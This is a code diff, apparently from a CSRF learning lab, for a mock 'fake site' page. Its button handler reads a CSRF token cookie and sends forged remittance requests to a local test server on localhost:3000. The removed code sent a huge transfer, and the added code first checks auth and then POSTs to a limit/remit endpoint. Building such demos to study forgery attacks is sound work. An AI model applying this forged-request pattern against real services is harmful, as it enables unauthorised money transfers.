@@ -108,23 +108,21 @@
           if (parts.length === 2) return parts.pop().split(";").shift();
         }
 
+        async function sendMoney() {}
+
         document.querySelector(".fake-button").addEventListener("click", async () => {
           console.log("クリックされました");
 
           try {
-            const csrfToken = getCookie("csrfToken");
-            console.log("CSRFトークン:", csrfToken);
+            const csrfTokenForCookie = getCookie("csrfToken");
+            console.log("CSRFトークン:", csrfTokenForCookie);
 
-            const response = await fetch("http://localhost:3000/csrf/remit", {
-              method: "POST",
+            const response = await fetch("http://localhost:3000/csrf/check_auth", {
+              method: "GET",
               headers: {
                 "Content-Type": "application/json",
-                "X-CSRF-Token": csrfToken || "",
+                "X-CSRF-Token": csrfTokenForCookie || "",
               },
-              body: JSON.stringify({
-                amount: 50000000000,
-                message: "これは偽サイトからのリクエストです",
-              }),
             });
 
             if (response.status !== 200) {
@@ -132,8 +130,15 @@
               throw new Error(`送金リクエストが失敗しました: ${errorText}`);
             }
 
-            const result = await response.json();
-            console.log("送金成功:", result);
+            const sendResponse = await fetch("http://localhost:3000/limit/remit", {
+              method: "POST",
+              headers: {
+                "Content-Type": "application/json",
+                "X-CSRF-Token": csrfTokenForCookie || "",
+              },
+            });
+
+            console.log("送金成功:", sendResponse);
           } catch (error) {
             console.error("送金に失敗しました:", error);
           }
